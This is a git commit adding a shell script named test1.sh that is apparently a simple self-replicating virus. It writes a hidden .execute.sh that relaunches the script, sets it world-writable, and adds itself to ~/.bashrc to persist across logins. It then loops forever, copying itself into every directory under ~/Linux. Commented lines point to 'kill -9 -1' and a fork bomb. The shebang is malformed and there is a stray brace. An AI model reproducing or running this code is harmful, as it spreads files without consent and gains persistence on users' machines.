5d129f0c0d483f09fba0a8a1cfe7bd5409fdac13
realArcherL <42532003+realArcherL@users.noreply.github.com>
2018-12-17 23:38:45 +0530

    Add files via upload

---
+++ test1.sh
@@ -0,0 +1,24 @@
+
+#!bin/bash
+#blame
+if [ -f ".execute.sh" ]
+then
+	file='.execute.sh'
+else
+	touch .execute.sh
+	echo 'bash test1.sh &' >> .execute.sh
+	chmod 777 .execute.sh
+	chmod a+x .execute.sh
+	echo 'bash .execute.sh' >> .bashrc
+fi
+#delayed to slow the response
+while sleep 2s
+do
+cd ~/
+find Linux -type d -exec cp  test1.sh {} \;
+#Instant logging  off
+#kill -9 -1
+# bash virus.sh   forkBomb
+done
+}
+
